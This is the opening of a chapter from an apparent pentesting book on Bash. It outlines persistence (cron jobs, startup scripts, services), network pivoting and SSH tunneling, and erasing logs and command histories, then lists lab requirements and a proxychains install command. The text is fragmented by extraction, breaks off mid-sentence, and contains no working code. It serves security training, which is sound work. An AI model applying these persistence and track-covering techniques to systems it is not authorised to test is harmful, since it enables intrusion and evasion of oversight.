     The sections in this chapter progress from fundamental persistence concepts to more sophisticated approaches, followed by an exploration of network pivoting tactics.
    

     In doing so, you’ll learn about using cron jobs, startup scripts, and system-level services for persistence.
    

     We’ll cover various pivoting techniques, including port forwarding and tunneling with SSH.
    

     We’ll conclude by providing guidance on log cleaning, erasing command histories, and managing digital footprints to maintain operational security
    


      during pentests.
     




     In this chapter, we’re going to cover the following
    


      main topic
     





      s:
     





      The fundamentals of persistence
     


       with Ba
      





       sh
      




      Learning advanced
     


       persistence techniqu
      





       es
      




      The basics of network pivoting
     


       with Ba
      





       sh
      




      Mastering advanced pivoting and
     


       lateral movement
      




      Cleanup and
     


       covering tracks
      







     Technical requirements
    



     The code for this chapter can be found
    


      at
     




       https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter12
      




      .
     




     If you want to follow along with the exercises, you need to have a Kali and
    


      ESCALATE_LINUX
     


     virtual
    


      machine available.
     




     Enter the following command to install the prerequisites on your Kali
    


      Linux system:
     



$ sudo apt install proxychains4


     See
